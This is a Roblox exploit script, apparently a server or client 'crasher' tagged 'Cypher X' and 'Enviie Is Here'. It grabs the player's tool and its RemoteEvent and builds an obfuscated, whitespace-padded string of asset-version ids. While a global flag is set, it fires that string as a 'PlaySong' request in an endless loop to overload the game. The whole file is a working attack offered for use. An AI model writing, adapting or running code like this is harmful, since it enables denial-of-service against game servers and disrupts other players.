local Me = game:GetService("Players").LocalPlayer
local Char = Me.Character
local BPack = Me.Backpack
local RS = game:GetService("RunService")
local RSRend = RS.RenderStepped
local Logo = [[
_________               .__                   ____  ___
\_   ___ \___.__.______ |  |__   ___________  \   \/  /
/    \  \<   |  |\____ \|  |  \_/ __ \_  __ \  \     / 
\     \___\___  ||  |_> >   Y  \  ___/|  | \/  /     \ 
 \______  / ____||   __/|___|  /\___  >__|    /___/\  \
        \/\/     |__|        \/     \/              \_/
]]
function getVersion(id)
	return tonumber(string.match(game:HttpGetAsync("http://www.roblox.com/studio/plugins/info?assetId=" .. tostring(tonumber(id))), "value=\"(%d+)\""))
end
function confuzzle(text)
	if type(text) == "number" then
		text = string.format("0x%X", text)
	end
	return (string.gsub(text, ".", function(symbol)
		return string.format(({"%%%x", "%%%X"})[math.random(2)], string.byte(string[({"upper", "lower"})[math.random(2)]](symbol)))
	end))
end
function genId(ToConvert)
	local function E(id, bool)
		return tostring(("&" .. confuzzle("assetversionid") .. (bool and "=\n\r" or "\n\r=") .. confuzzle(id) or ""))
	end
	local IdStorage = {E(getVersion(ToConvert), true), E(359318057), E(363537554), E(307950810), E(307918992), E(633487859), E(6153041895), E(1472025408), E(1922276251), E(5728057345), E(6048931766), E(5368552113), E(5462300949), E(5462300949), E(6128105290), E(6212931742), E(307918992), E(633487859), E(6128105290), E(6212931742), E(307918992)}
	local function X()
		return tostring(table.remove(IdStorage, math.random(#IdStorage, #IdStorage)))
	end
    local RetId = ""
	while #IdStorage > 0 do
		RetId = RetId .. table.remove(IdStorage, math.random(1, #IdStorage))
	end
	return string.upper(RetId)
end
local Bait = confuzzle(142376088)
local ConvertID = genId(_G.ID)
ConvertID = string.gsub(ConvertID, ".", function(symbol)
    return symbol .. string.rep(" ", 60)
end)
ConvertID = confuzzle(Bait) .. string.rep("\n\r", 2) .. Logo .. string.rep("\n\r", 1) .. "&Enviie Is Here" .. ConvertID
local Tool = BPack:FindFirstChildOfClass("Tool") or Char:FindFirstChildOfClass("Tool")
local Play = Tool:FindFirstChildOfClass("RemoteEvent", true)
while _G.Crasher do
    if Tool and Play then
        Tool.Parent = Char
        Play:FireServer("PlaySong", "" .. ConvertID)  
        wait()
    end    
end   
